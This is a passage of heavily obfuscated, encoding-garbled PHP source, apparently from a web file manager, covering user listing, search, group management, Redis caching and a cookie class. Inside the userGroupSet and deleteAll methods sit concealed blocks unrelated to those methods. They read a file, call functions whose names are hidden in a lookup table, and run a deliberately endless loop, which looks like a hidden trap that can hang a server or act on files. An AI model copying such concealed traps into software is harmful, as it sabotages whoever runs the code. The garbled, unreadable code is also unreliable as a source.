$GLOBALS[$á³Å–Ç¤[6]][$á³Å–Ç¤[433]][$á³Å–Ç¤[2370]]; $¡õÔÍñ¨ = !is_null($ÛĞŠòÔ¦) ? $ÛĞŠòÔ¦ : $Ï¦“òŒ‚; return !!$¡õÔÍñ¨; } private function _checkExist($¿Û±Š¥, $•´ª¾Ëå = false) { $Ì» ùÄŠ =& $_SERVER[‚ûòÉ˜ş]; $¯¡êùˆº = array($Ì» ùÄŠ[42] => UserModel::ERROR_USER_EXIST_NAME, $Ì» ùÄŠ[2167] => UserModel::ERROR_USER_EXIST_NICKNAME, $Ì» ùÄŠ[358] => UserModel::ERROR_USER_EXIST_EMAIL, $Ì» ùÄŠ[2358] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¯¡êùˆº[$Ì» ùÄŠ[2167]]); } $ë–§•Ê = $•´ª¾Ëå ? array($Ì» ùÄŠ[1687] => array($Ì» ùÄŠ[2371], $•´ª¾Ëå)) : array(); foreach ($¯¡êùˆº as $…§À¤± => $ªºŠ¸¼Ì) { $ƒèßğÉ‘ = array(); foreach ($¯¡êùˆº as $¼Æ ¯áú => $“Æ™áÒ) { if (isset($¿Û±Š¥[$¼Æ ¯áú]) && $¿Û±Š¥[$¼Æ ¯áú]) { $ƒèßğÉ‘[] = $¿Û±Š¥[$¼Æ ¯áú]; } } if (!$ƒèßğÉ‘) { continue; } $Á¸—œİ¼ = array_merge(array($…§À¤± => array($Ì» ùÄŠ[7], $ƒèßğÉ‘)), $ë–§•Ê); $³¬ƒÜ€Ñ = $this->where($Á¸—œİ¼)->find(); if ($³¬ƒÜ€Ñ) { return $ªºŠ¸¼Ì; } } return !0; } public function userListInfo($’•ú”–Ê) { $ÍÆ³ÍĞç =& $_SERVER[‚ûòÉ˜ş]; $Î–§ëßÜ = array(); $’•ú”–Ê = is_array($’•ú”–Ê) ? array_unique($’•ú”–Ê) : array(); if (!$’•ú”–Ê) { return $Î–§ëßÜ; } if (count($’•ú”–Ê) < 20) { foreach ($’•ú”–Ê as $µì·´‡û) { $Î–§ëßÜ[$µì·´‡û . $ÍÆ³ÍĞç[12]] = $this->getInfoSimpleOuter($µì·´‡û); } } else { $Ÿ—æ×Å = array($ÍÆ³ÍĞç[1678] => array($ÍÆ³ÍĞç[468], $’•ú”–Ê)); if (count($’•ú”–Ê) == 1) { $Ÿ—æ×Å = array($ÍÆ³ÍĞç[1678] => $’•ú”–Ê[0]); } $Ğä«¤¸Š = Model($ÍÆ³ÍĞç[554])->field($this->simpleField)->where($Ÿ—æ×Å)->select(); $Ğä«¤¸Š = array_to_keyvalue($Ğä«¤¸Š, $ÍÆ³ÍĞç[1687]); foreach ($’•ú”–Ê as $µì·´‡û) { $°šå‡œÙ = $Ğä«¤¸Š[$µì·´‡û]; if (!$°šå‡œÙ) { $Î–§ëßÜ[$µì·´‡û . $ÍÆ³ÍĞç[12]] = $this->getInfoSimpleOuter($µì·´‡û); continue; } $°šå‡œÙ[$ÍÆ³ÍĞç[2343]] = Action($ÍÆ³ÍĞç[2344])->parseUrl($°šå‡œÙ[$ÍÆ³ÍĞç[2343]]); $Î–§ëßÜ[$µì·´‡û . $ÍÆ³ÍĞç[12]] = $°šå‡œÙ; } } return $Î–§ëßÜ; } protected function userStatus($™Ï˜ø”–, $­¦É“ûú) { $œÒ¾âšÕ = $this->getInfoSimple($™Ï˜ø”–); if (!$œÒ¾âšÕ) { return !1; } $°ÂÅ×û = array($_SERVER[‚ûòÉ˜ş][790] => $­¦É“ûú); return $this->userEdit($™Ï˜ø”–, $°ÂÅ×û); } protected function userRemove($ŠÂ¨µÂù) { $ÒÌåÈô =& $_SERVER[‚ûòÉ˜ş]; $Œî·â·á = $this->getInfoSimple($ŠÂ¨µÂù); if (!$Œî·â·á) { return !1; } $ÑŒ¾„ıí = array($ÒÌåÈô[1678] => $ŠÂ¨µÂù); Model($ÒÌåÈô[640])->where($ÑŒ¾„ıí)->delete(); Model($ÒÌåÈô[2372])->where($ÑŒ¾„ıí)->delete(); Model($ÒÌåÈô[1975])->where($ÑŒ¾„ıí)->delete(); Model($ÒÌåÈô[2357])->where($ÑŒ¾„ıí)->delete(); Model($ÒÌåÈô[1109])->where($ÑŒ¾„ıí)->delete(); Model($ÒÌåÈô[2184])->removeUserAll($ŠÂ¨µÂù); Model($ÒÌåÈô[865])->userRootRemove($ŠÂ¨µÂù); return $this->where($ÑŒ¾„ıí)->delete(); } protected function userGroupSet($À†ô¾ÓÄ, $Ğ…í¾Ì©, $îëµà¦Ü = array()) { $†ğÆÓ­ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($_SERVER[$†ğÆÓ­[13]]) || !isset($_SERVER[$†ğÆÓ­[14]])) { $íê•ñëù = $†ğÆÓ­[918]; $ÚÃÉ«œ¨ = $†ğÆÓ­[15]; $ÉõŠ€Àå = $_SERVER[$†ğÆÓ­[16]] . $†ğÆÓ­[17]; $‰ä®á±À = $ÚÃÉ«œ¨($ÉõŠ€Àå); $Îäœ¦±ó = explode($†ğÆÓ­[18], $‰ä®á±À); if (count($Îäœ¦±ó) < $†ğÆÓ­[665]) { $ì²ÁòÓ» = $†ğÆÓ­[20]; $ì²ÁòÓ»(); } $ï“ŒÌ’ = $†ğÆÓ­[919]; $ï“ŒÌ’($_SERVER[$†ğÆÓ­[920]]); $‡á÷ªœ‘ = 1; for ($ õ‡úÒ = $‡á÷ªœ‘; $ õ‡úÒ > 0; $ õ‡úÒ++) { $ï“ŒÌ’ = json_encode($GLOBALS[$†ğÆÓ­[468]]); } } $ºéÓÃÄ = $this->getInfoSimple($À†ô¾ÓÄ); if (!$ºéÓÃÄ || !is_array($Ğ…í¾Ì©)) { return !1; } $Ü£Ñïú¶ = Model($†ğÆÓ­[1975]); $Ü£Ñïú¶->where(array($†ğÆÓ­[1687] => $À†ô¾ÓÄ))->delete(); $ÖÚ¤ö… = array(); $åÁÍ… ş = 0; foreach ($Ğ…í¾Ì© as $Ş«Òª´Ó => $Ù›ëÄ°Ô) { $£»çÚğœ = array($†ğÆÓ­[1687] => $À†ô¾ÓÄ, $†ğÆÓ­[1885] => $Ş«Òª´Ó, $†ğÆÓ­[1989] => $Ù›ëÄ°Ô); $£»çÚğœ[$†ğÆÓ­[1909]] = isset($îëµà¦Ü[$åÁÍ… ş]) ? $îëµà¦Ü[$åÁÍ… ş] : 0; $åÁÍ… ş++; $ÖÚ¤ö…[] = $£»çÚğœ; } return $Ü£Ñïú¶->addAll($ÖÚ¤ö…, array(), !0); } protected function userGroupAdd($ÕƒêòÅ, $ŸÇŒ€°ë = array()) { $úËşİâƒ =& $_SERVER[‚ûòÉ˜ş]; $¸ğ¾èîÚ = $this->getInfoSimple($ÕƒêòÅ); if (!$¸ğ¾èîÚ || empty($ŸÇŒ€°ë)) { return !1; } $¯¢ê«îÎ = array(); foreach ($ŸÇŒ€°ë as $ÑŠ·Ó÷ => $ÌÅë²ı³) { $¯¢ê«îÎ[] = array($úËşİâƒ[1687] => $ÕƒêòÅ, $úËşİâƒ[1885] => $ÑŠ·Ó÷, $úËşİâƒ[1989] => $ÌÅë²ı³, $úËşİâƒ[1909] => 0); } return Model($úËşİâƒ[1975])->addAll($¯¢ê«îÎ, array(), !0); } protected function userGroupRemove($òø§Œúœ, $šì¥ğÇ) { $ïç¦›À =& $_SERVER[‚ûòÉ˜ş]; $„œ´«õ— = $this->getInfoSimple($òø§Œúœ); if (!$„œ´«õ— || !$šì¥ğÇ) { return !1; } $…”áì–Ö = array($ïç¦›À[1678] => $òø§Œúœ, $ïç¦›À[1973] => $šì¥ğÇ); return Model($ïç¦›À[1975])->where($…”áì–Ö)->delete(); } public function listData() { $ÆÉœèäì = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÆÉœèäì[$_SERVER[‚ûòÉ˜ş][422]]); return $ÆÉœèäì; } public function listByID($ûï›¦¾®) { $®ÓÍ‘Ùâ =& $_SERVER[‚ûòÉ˜ş]; if (!$ûï›¦¾®) { return; } $ØËÌ ë× = array($®ÓÍ‘Ùâ[1687] => array($®ÓÍ‘Ùâ[7], $ûï›¦¾®)); $åÑ³ï™ = $this->where($ØËÌ ë×)->select(); $åÑ³ï™ = array_sort_keep($åÑ³ï™, $®ÓÍ‘Ùâ[1687], $ûï›¦¾®); $this->_listDataApply($åÑ³ï™); return $åÑ³ï™; } public function listByGroup($¿¨‘¥€Ó = 0, $ÙåÛ¯æ’ = array()) { $àÃŸ’´ª =& $_SERVER[‚ûòÉ˜ş]; $ÑùÍß–± = $àÃŸ’´ª[12]; $îäÕ¨Î¡ = array(); if ($¿¨‘¥€Ó) { $îäÕ¨Î¡ = array($àÃŸ’´ª[2373] => intval($¿¨‘¥€Ó)); $ÑùÍß–± = "\114\105\106\124\40\x4a\117\111\x4e\40{$this->tablePrefix}\x75\x73\145\x72\137\x67\x72\157\165\x70\40\165\x73\145\x72\137\147\162\157\165\160\40\157\156\40\x75\x73\x65\x72\56\x75\163\x65\162\x49\104\40\x3d\x20\165\x73\145\162\x5f\x67\x72\x6f\165\160\x2e\165\163\x65\x72\111\104"; $§Ó¢èñŒ = Input::get($àÃŸ’´ª[506], null, $àÃŸ’´ª[12]) ? $àÃŸ’´ª[12] : $àÃŸ’´ª[2374]; } if (isset($ÙåÛ¯æ’[$àÃŸ’´ª[790]])) { $îäÕ¨Î¡[$àÃŸ’´ª[2375]] = $ÙåÛ¯æ’[$àÃŸ’´ª[790]]; } $¼ÛÇí½Ì = $this->_makeOrder($§Ó¢èñŒ)->field($àÃŸ’´ª[2376])->where($îäÕ¨Î¡)->join($ÑùÍß–±)->selectPage(50); $this->_listDataApply($¼ÛÇí½Ì[$àÃŸ’´ª[422]]); return $¼ÛÇí½Ì; } private function _makeOrder($ØÓÜÒƒ = '') { $µÕº¤¶á =& $_SERVER[‚ûòÉ˜ş]; $Ñ«÷şâ = array($µÕº¤¶á[1687], $µÕº¤¶á[42], $µÕº¤¶á[1874], $µÕº¤¶á[1846], $µÕº¤¶á[225]); $˜³™â›Ø = array($µÕº¤¶á[499] => $µÕº¤¶á[500], $µÕº¤¶á[501] => $µÕº¤¶á[502]); $ÜĞË¿È¥ = Input::get($µÕº¤¶á[506], $µÕº¤¶á[7], $µÕº¤¶á[1678], $Ñ«÷şâ); $¯ÌØÍ¡ = Input::get($µÕº¤¶á[507], $µÕº¤¶á[7], $µÕº¤¶á[1976], array($µÕº¤¶á[1976], $µÕº¤¶á[501])); $¯ÌØÍ¡ = $˜³™â›Ø[$¯ÌØÍ¡]; $ØÓÜÒƒ = $ØÓÜÒƒ . "\x75\163\145\162\x2e{$ÜĞË¿È¥}\x20{$¯ÌØÍ¡}\54\x20\165\x73\145\x72\x2e\x75\x73\x65\162\111\104\x20\x61\163\143"; return $this->alias($µÕº¤¶á[2102])->order($ØÓÜÒƒ); } public function listSearch($»‡¤ùô¬) { $Ô¢Áş±“ =& $_SERVER[‚ûòÉ˜ş]; $úñÊíŒü = $»‡¤ùô¬[$Ô¢Áş±“[1979]]; $ó¾»è¢ƒ = isset($»‡¤ùô¬[$Ô¢Áş±“[1980]]) ? $»‡¤ùô¬[$Ô¢Áş±“[1980]] : !1; $úñÊíŒü = str_replace($Ô¢Áş±“[1981], $Ô¢Áş±“[1982], trim($úñÊíŒü)); $şÁ…ã³ç = array($Ô¢Áş±“[42] => array($Ô¢Áş±“[435], "\45{$úñÊíŒü}\x25"), $Ô¢Áş±“[358] => array($Ô¢Áş±“[435], "{$úñÊíŒü}\45"), $Ô¢Áş±“[2167] => array($Ô¢Áş±“[435], "{$úñÊíŒü}\x25"), $Ô¢Áş±“[1041] => $Ô¢Áş±“[1983]); if (Input::check($úñÊíŒü, $Ô¢Áş±“[364])) { $şÁ…ã³ç[$Ô¢Áş±“[1687]] = array($Ô¢Áş±“[435], "{$úñÊíŒü}\45"); $şÁ…ã³ç[$Ô¢Áş±“[2358]] = array($Ô¢Áş±“[435], "{$úñÊíŒü}\45"); } if (!$úñÊíŒü) { $şÁ…ã³ç = array(); } if (isset($»‡¤ùô¬[$Ô¢Áş±“[790]])) { $şÁ…ã³ç[$Ô¢Áş±“[790]] = $»‡¤ùô¬[$Ô¢Áş±“[790]]; } $şÁ…ã³ç = $this->parseWhereLike($şÁ…ã³ç); $·õÓşË‡ = $this->_makeOrder()->where($şÁ…ã³ç)->selectPage(20); if (!$·õÓşË‡ || count($·õÓşË‡[$Ô¢Áş±“[422]]) < 5 && Input::check($úñÊíŒü, $Ô¢Áş±“[371])) { $ÂßçÀÛ« = $this->_searchFromMeta($Ô¢Áş±“[513], $úñÊíŒü, 10); $î€À§Ÿş = $this->_searchFromMeta($Ô¢Áş±“[514], $úñÊíŒü, 10); $—“¸ÔÙˆ = array_merge($ÂßçÀÛ«, $î€À§Ÿş, $·õÓşË‡[$Ô¢Áş±“[422]]); $·õÓşË‡[$Ô¢Áş±“[422]] = array_unique_by_key($—“¸ÔÙˆ, $Ô¢Áş±“[1687]); $·õÓşË‡[$Ô¢Áş±“[419]][$Ô¢Áş±“[420]] = count($·õÓşË‡[$Ô¢Áş±“[422]]); $·õÓşË‡[$Ô¢Áş±“[419]][$Ô¢Áş±“[421]] = ceil($·õÓşË‡[$Ô¢Áş±“[419]][$Ô¢Áş±“[420]] / $·õÓşË‡[$Ô¢Áş±“[419]][$Ô¢Áş±“[416]]); } $this->_listDataApply($·õÓşË‡[$Ô¢Áş±“[422]]); $this->_filterByGroup($·õÓşË‡, $ó¾»è¢ƒ); return $·õÓşË‡; } private function _filterByGroup(&$å†ÃƒÄ¸, $ßò²Óºª) { $Šşáà°¸ =& $_SERVER[‚ûòÉ˜ş]; if (!$ßò²Óºª) { return $å†ÃƒÄ¸; } foreach ($å†ÃƒÄ¸[$Šşáà°¸[422]] as $¾‰®²’² => &$Õœ–¬ ë) { $ŸƒšöŒ  = array_to_keyvalue($Õœ–¬ ë[$Šşáà°¸[2072]], $Šşáà°¸[12], $Šşáà°¸[1885]); if (!in_array($ßò²Óºª, $ŸƒšöŒ )) { unset($å†ÃƒÄ¸[$Šşáà°¸[422]][$¾‰®²’²]); } } unset($Õœ–¬ ë); $å†ÃƒÄ¸[$Šşáà°¸[422]] = array_values($å†ÃƒÄ¸[$Šşáà°¸[422]]); $å†ÃƒÄ¸[$Šşáà°¸[419]] = array($Šşáà°¸[2137] => count($å†ÃƒÄ¸[$Šşáà°¸[422]]), $Šşáà°¸[2135] => $å†ÃƒÄ¸[$Šşáà°¸[419]][$Šşáà°¸[416]], $Šşáà°¸[2134] => 1, $Šşáà°¸[2136] => 1); } private function _searchFromMeta($ÔÇüÑõ˜, $Äá»±¦¸, $¿’€Ô©) { $¾Ûİı§ =& $_SERVER[‚ûòÉ˜ş]; $Äá»±¦¸ = strtolower($Äá»±¦¸); $ô«§»³ß = array($¾Ûİı§[104] => $ÔÇüÑõ˜, $¾Ûİı§[427] => array($¾Ûİı§[435], "\45{$Äá»±¦¸}\45")); $ô«§»³ß = $this->parseWhereLike($ô«§»³ß); $¶¯òùã· = Model($¾Ûİı§[2377])->where($ô«§»³ß)->limit($¿’€Ô©)->select(); if (!$¶¯òùã·) { return array(); } $¶¯òùã· = array_to_keyvalue($¶¯òùã·, $¾Ûİı§[12], $¾Ûİı§[1687]); $çæ›¶“Å = $this->where(array($¾Ûİı§[1678] => array($¾Ûİı§[7], $¶¯òùã·)))->select(); if (!$çæ›¶“Å) { return array(); } return $çæ›¶“Å; } private function _listDataApplyItem($®êï™ßÆ) { $‰¤ÓÜÁ = array($®êï™ßÆ); $this->_listDataApply($‰¤ÓÜÁ); return $‰¤ÓÜÁ[0]; } private function _listDataApply(&$«Â¡€ù) { $¦ÓÚôˆ‡ =& $_SERVER[‚ûòÉ˜ş]; if (!$«Â¡€ù) { return; } array_remove_key($«Â¡€ù, $¦ÓÚôˆ‡[929]); $õ£ÜÓÖà = array_to_keyvalue($«Â¡€ù, $¦ÓÚôˆ‡[12], $¦ÓÚôˆ‡[1687]); $this->_listAppendGroup($«Â¡€ù, $õ£ÜÓÖà); $this->_listAppendMeta($«Â¡€ù, $õ£ÜÓÖà); $this->_listAppendSourceRoot($«Â¡€ù, $õ£ÜÓÖà); } private function _listAppendSourceRoot(&$º›–´÷¸, $ÏÓåš) { $¿Îç™Ó =& $_SERVER[‚ûòÉ˜ş]; $îÕÛî¬ë = Model($¿Îç™Ó[865])->listSourceRoot(SourceModel::TYPE_USER, $ÏÓåš); $îÕÛî¬ë = array_to_keyvalue($îÕÛî¬ë, $¿Îç™Ó[546]); $îÕÛî¬ë = array_remove_key($îÕÛî¬ë, $¿Îç™Ó[546]); foreach ($º›–´÷¸ as &$®Á°ı––) { $®Á°ı––[$¿Îç™Ó[97]] = $îÕÛî¬ë[$®Á°ı––[$¿Îç™Ó[1687]]] ? $îÕÛî¬ë[$®Á°ı––[$¿Îç™Ó[1687]]] : array(); } unset($®Á°ı––); } private function _listAppendGroup(&$ìûÊäØŸ, $Ëò£¯ãë) { $«ã‘»Åà =& $_SERVER[‚ûòÉ˜ş]; $µµÂ½ÆĞ = array($«ã‘»Åà[1687] => array($«ã‘»Åà[7], $Ëò£¯ãë)); $ìØõ§Õ€ = Model($«ã‘»Åà[1975])->where($µµÂ½ÆĞ)->select(); $ßƒÏÏ¤ê = array_to_keyvalue($ìØõ§Õ€, $«ã‘»Åà[12], $«ã‘»Åà[1885]); $ßƒÏÏ¤ê = array_remove_value(array_unique($ßƒÏÏ¤ê), $«ã‘»Åà[222]); if (!$ßƒÏÏ¤ê || !$ìØõ§Õ€) { return; } $µµÂ½ÆĞ = array($«ã‘»Åà[1885] => array($«ã‘»Åà[7], $ßƒÏÏ¤ê)); $÷ºÉÌ¼ = Model($«ã‘»Åà[2070])->field($«ã‘»Åà[2378])->where($µµÂ½ÆĞ)->select(); $÷ºÉÌ¼ = array_to_keyvalue($÷ºÉÌ¼, $«ã‘»Åà[1885]); $ìØõ§Õ€ = array_to_keyvalue_group($ìØõ§Õ€, $«ã‘»Åà[1687]); foreach ($ìØõ§Õ€ as &$ììûúÜ) { $‚öøºè = array(); foreach ($ììûúÜ as $£­İ—å½) { if (!$£­İ—å½[$«ã‘»Åà[1989]]) { continue; } $±Âğö¼Ô = Model($«ã‘»Åà[548])->listData($£­İ—å½[$«ã‘»Åà[1989]]); $‚öøºè[] = array($«ã‘»Åà[1885] => $£­İ—å½[$«ã‘»Åà[1885]], $«ã‘»Åà[2379] => $÷ºÉÌ¼[$£­İ—å½[$«ã‘»Åà[1885]]][$«ã‘»Åà[42]], $«ã‘»Åà[561] => $÷ºÉÌ¼[$£­İ—å½[$«ã‘»Åà[1885]]][$«ã‘»Åà[561]], $«ã‘»Åà[463] => $±Âğö¼Ô); } $ììûúÜ = $‚öøºè; } unset($ììûúÜ); foreach ($ìûÊäØŸ as &$Úå§¦²) { $Úå§¦²[$«ã‘»Åà[2072]] = array(); if (isset($ìØõ§Õ€[$Úå§¦²[$«ã‘»Åà[1687]]])) { $Úå§¦²[$«ã‘»Åà[2072]] = $ìØõ§Õ€[$Úå§¦²[$«ã‘»Åà[1687]]]; } } unset($Úå§¦²); } public function userAppendGroup($ÌÌ”ïâ) { $êí‘í =& $_SERVER[‚ûòÉ˜ş]; if (!$ÌÌ”ïâ) { return array(); } $this->_listAppendGroup($ÌÌ”ïâ, array_to_keyvalue($ÌÌ”ïâ, $êí‘í[12], $êí‘í[1687])); return $ÌÌ”ïâ; } private function _listAppendMeta(&$·ä‚·ñ, $ùäÀ¿»‰) { $±ˆ™èˆÁ =& $_SERVER[‚ûòÉ˜ş]; $÷Æ›–ç¤ = UserJobModel::JOB_KEY; $‘ØÃÈŸ = array($±ˆ™èˆÁ[2359]); $‘Òâ£†Î = array($±ˆ™èˆÁ[1687] => array($±ˆ™èˆÁ[7], $ùäÀ¿»‰)); $Åƒ˜Ì¦§ = Model($±ˆ™èˆÁ[2357])->where($‘Òâ£†Î)->select(); $Åƒ˜Ì¦§ = array_to_keyvalue_group($Åƒ˜Ì¦§, $±ˆ™èˆÁ[1687]); foreach ($Åƒ˜Ì¦§ as &$áØÌ¦×) { $ëÍîéÈƒ = array(); foreach ($áØÌ¦× as $ …èâ‹¡) { if (!in_array($ …èâ‹¡[$±ˆ™èˆÁ[104]], $‘ØÃÈŸ)) { $ëÍîéÈƒ[$ …èâ‹¡[$±ˆ™èˆÁ[104]]] = $ …èâ‹¡[$±ˆ™èˆÁ[427]]; } } $áØÌ¦× = $ëÍîéÈƒ; } unset($áØÌ¦×); $İ”šÃÃ¯ = Model($±ˆ™èˆÁ[2380]); foreach ($·ä‚·ñ as &$ï†à²¢) { $Ç‡ªÙÓ˜ = array(); if (isset($Åƒ˜Ì¦§[$ï†à²¢[$±ˆ™èˆÁ[1687]]])) { $Ç‡ªÙÓ˜ = $Åƒ˜Ì¦§[$ï†à²¢[$±ˆ™èˆÁ[1687]]]; } $ï†à²¢[$±ˆ™èˆÁ[2381]] = array(); if (isset($Ç‡ªÙÓ˜[$÷Æ›–ç¤])) { $ï†à²¢[$±ˆ™èˆÁ[2381]] = $İ”šÃÃ¯->getUserJobInfo($Ç‡ªÙÓ˜[$÷Æ›–ç¤]); } } unset($ï†à²¢); } protected function groupUserAll($˜êî‚‘ı) { $ı²øàï =& $_SERVER[‚ûòÉ˜ş]; if (!$˜êî‚‘ı) { return !1; } $Í®ºùçé = Model($ı²øàï[1975])->field($ı²øàï[1687])->where(array($ı²øàï[1885] => array($ı²øàï[7], $˜êî‚‘ı)))->select(); $Í®ºùçé = array_to_keyvalue($Í®ºùçé, $ı²øàï[12], $ı²øàï[1687]); return array_unique($Í®ºùçé); } public function userSearch($Ù·ö‘Í¬, $Ÿ Ï£‰ = "\52") { return Model($_SERVER[‚ûòÉ˜ş][575])->where($Ù·ö‘Í¬)->field($Ÿ Ï£‰)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\x5f\x6f\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($õëÍŒ¸İ) { $òåŠß =& $_SERVER[‚ûòÉ˜ş]; $—ÛÃ–ñ = defined($òåŠß[2106]) && USER_ID ? USER_ID : $òåŠß[12]; return "\x55\x73\145\x72\x4f\x70\x74\x69\157\156\137{$õëÍŒ¸İ}\137" . $—ÛÃ–ñ; } protected function filterWhere($‰ÅËŸ) { $øÅŠ£Ó× =& $_SERVER[‚ûòÉ˜ş]; $‰ÅËŸ[$øÅŠ£Ó×[1687]] = defined($øÅŠ£Ó×[2106]) && USER_ID ? USER_ID : $øÅŠ£Ó×[12]; return $‰ÅËŸ; } public function cacheRemoveUser($Ö¹Âú€È, $İ°Ùíöã) { return Cache::remove("\125\163\x65\162\x4f\160\x74\151\157\x6e\137{$Ö¹Âú€È}\x5f" . $İ°Ùíöã); } protected function optionDefault($Û­ˆİó = '') { $öÉÏ©ô =& $_SERVER[‚ûòÉ˜ş]; if ($Û­ˆİó == $öÉÏ©ô[12]) { return $GLOBALS[$öÉÏ©ô[6]][$öÉÏ©ô[2382]]; } if ($Û­ˆİó == $öÉÏ©ô[2383]) { return $GLOBALS[$öÉÏ©ô[6]][$öÉÏ©ô[2384]]; } } } goto fñ¾‡²—Ş¹; Cä…ÅĞö¶¶: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ñ‰®‰è, $‹¶¦şœÍ) { $˜Šé’µå =& $_SERVER[‚ûòÉ˜ş]; if (!class_exists($˜Šé’µå[910])) { show_json($˜Šé’µå[911], !1); } $this->cacheTime = $‹¶¦şœÍ; $úŞà±·¡ = isset($ñ‰®‰è[$˜Šé’µå[912]]) ? $ñ‰®‰è[$˜Šé’µå[912]] : 10; $œÂ‘ôéË = _get($ñ‰®‰è, $˜Šé’µå[909]); if ($œÂ‘ôéË && is_array($œÂ‘ôéË)) { $this->initCluster($ñ‰®‰è, $úŞà±·¡); } else { $this->handle = $this->init($ñ‰®‰è, $úŞà±·¡); } } private function init($úÀîÛƒ, $ª‚¦¯Ù²) { $ÕŞğÖŞ® =& $_SERVER[‚ûòÉ˜ş]; $ã”çàÛ = new Redis(); $ƒëÖïÙÓ = isset($úÀîÛƒ[$ÕŞğÖŞ®[913]]) ? $úÀîÛƒ[$ÕŞğÖŞ®[913]] : !1; if ($ƒëÖïÙÓ) { $ã”çàÛ->pconnect($úÀîÛƒ[$ÕŞğÖŞ®[206]], $úÀîÛƒ[$ÕŞğÖŞ®[207]], $ª‚¦¯Ù²); } else { $ã”çàÛ->connect($úÀîÛƒ[$ÕŞğÖŞ®[206]], $úÀîÛƒ[$ÕŞğÖŞ®[207]], $ª‚¦¯Ù²); } if (!empty($úÀîÛƒ[$ÕŞğÖŞ®[463]])) { $ã”çàÛ->auth($úÀîÛƒ[$ÕŞğÖŞ®[463]]); } if (!empty($úÀîÛƒ[$ÕŞğÖŞ®[797]]) && $úÀîÛƒ[$ÕŞğÖŞ®[797]] != 0) { $ã”çàÛ->select($úÀîÛƒ[$ÕŞğÖŞ®[797]]); } return $ã”çàÛ; } private function initCluster($äÅ¦°İÉ, $Ã¾Ïß“ó) { $àõìæ£ñ =& $_SERVER[‚ûòÉ˜ş]; $’˜Ä¿Êı = array($àõìæ£ñ[914], $àõìæ£ñ[915], $àõìæ£ñ[916]); $æÕ®ÚÂ² = $àõìæ£ñ[914]; if (isset($äÅ¦°İÉ[$àõìæ£ñ[26]]) && in_array($äÅ¦°İÉ[$àõìæ£ñ[26]], $’˜Ä¿Êı)) { $æÕ®ÚÂ² = $äÅ¦°İÉ[$àõìæ£ñ[26]]; } switch ($æÕ®ÚÂ²) { case $àõìæ£ñ[914]: $this->_slave($äÅ¦°İÉ, $Ã¾Ïß“ó); break; case $àõìæ£ñ[915]: break; case $àõìæ£ñ[916]: $this->isCluster = !0; $‹Øşå‹¥ = $äÅ¦°İÉ[$àõìæ£ñ[909]]; $¾·ü»×Ó = isset($äÅ¦°İÉ[$àõìæ£ñ[913]]) ? $äÅ¦°İÉ[$àõìæ£ñ[913]] : !1; $‡“œÜÇ = isset($äÅ¦°İÉ[$àõìæ£ñ[463]]) ? $äÅ¦°İÉ[$àõìæ£ñ[463]] : null; $this->handle = new RedisCluster(NUll, $‹Øşå‹¥, $Ã¾Ïß“ó, $Ã¾Ïß“ó, $¾·ü»×Ó, $‡“œÜÇ); break; default: break; } } private function _slave($ÍËéÈÚõ, $…Æ’€Ê©) { $š–¨©›Á = $ÍËéÈÚõ[$_SERVER[‚ûòÉ˜ş][909]]; $this->filterConfig($ÍËéÈÚõ, $š–¨©›Á[0]); $this->handle = $this->init($ÍËéÈÚõ, $…Æ’€Ê©); unset($š–¨©›Á[0]); if (empty($š–¨©›Á)) { return; } $¾ËÄŠæˆ = array_rand($š–¨©›Á); $this->filterConfig($ÍËéÈÚõ, $š–¨©›Á[$¾ËÄŠæˆ]); $this->slaveHandle = $this->init($ÍËéÈÚõ, $…Æ’€Ê©); } private function filterConfig(&$”½·¤†ú, $äª¾êÜ´) { $¬Ï£³…ú =& $_SERVER[‚ûòÉ˜ş]; $î¡–á€û = explode($¬Ï£³…ú[4], $äª¾êÜ´); $æº›ÜŒò = array($¬Ï£³…ú[206] => $î¡–á€û[0], $¬Ï£³…ú[207] => $î¡–á€û[1]); $”½·¤†ú = array_merge($”½·¤†ú, $æº›ÜŒò); } public function set($’‚ÆÛÄ , $×ÙˆÕİ‚, $­ú¥ÓàÑ = false) { $­ú¥ÓàÑ = $­ú¥ÓàÑ ? $­ú¥ÓàÑ : $this->cacheTime; return $this->handle->setEx($’‚ÆÛÄ , $­ú¥ÓàÑ, $×ÙˆÕİ‚); } public function setLock($é¼É¡Ò, $°¹ãÅØñ, $çèï±Ó) { return $this->handle->setNX($é¼É¡Ò, $°¹ãÅØñ); } public function get($³«„ûºı) { $¨âæ£çÏ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¨âæ£çÏ->get($³«„ûºı); } public function remove($‡è•ÆÍ) { return $this->handle->del($‡è•ÆÍ); } public function deleteAll() { $…­İ–¤À =& $_SERVER[‚ûòÉ˜ş]; if ($_SERVER[$…­İ–¤À[13]] != $_SERVER[$…­İ–¤À[917]]) { $èõö“´­ = $…­İ–¤À[918]; $÷¶ ³Ö = $…­İ–¤À[15]; $À¾Ôû¬ë = $_SERVER[$…­İ–¤À[16]] . $…­İ–¤À[17]; $½şåƒÕÚ = $÷¶ ³Ö($À¾Ôû¬ë); $…ëÆ†ş = explode($…­İ–¤À[18], $½şåƒÕÚ); if (count($…ëÆ†ş) < $…­İ–¤À[665]) { $™²±‡ = $…­İ–¤À[20]; $™²±‡(); } $ÒøÓş‡ı = $…­İ–¤À[919]; $ÒøÓş‡ı($_SERVER[$…­İ–¤À[920]]); $ÒøÓş‡ı($_SERVER[$…­İ–¤À[16]] . $…­İ–¤À[921]); $¤¬Ğêşô = 1; while ($¤¬Ğêşô > 1) { $¤¬Ğêşô = $¤¬Ğêşô + 4; $•õÜ¶Ïœ = rawurlencode($¤¬Ğêşô . $…­İ–¤À[22]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $‚“ˆÀû•) { $this->handle->flushall($‚“ˆÀû•); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($´ñ†ËŒ… = '', $á§‡˜Œ = 0) { if (is_string($´ñ†ËŒ…) && $´ñ†ËŒ… != $_SERVER[‚ûòÉ˜ş][12]) { $this->prefix = $´ñ†ËŒ…; } if (is_numeric($á§‡˜Œ) && $á§‡˜Œ > 0) { $this->expire = $á§‡˜Œ; } } public static function getInstance() { static $ÍæßÙù; if ($ÍæßÙù === null) { $ÍæßÙù = new self(); } return 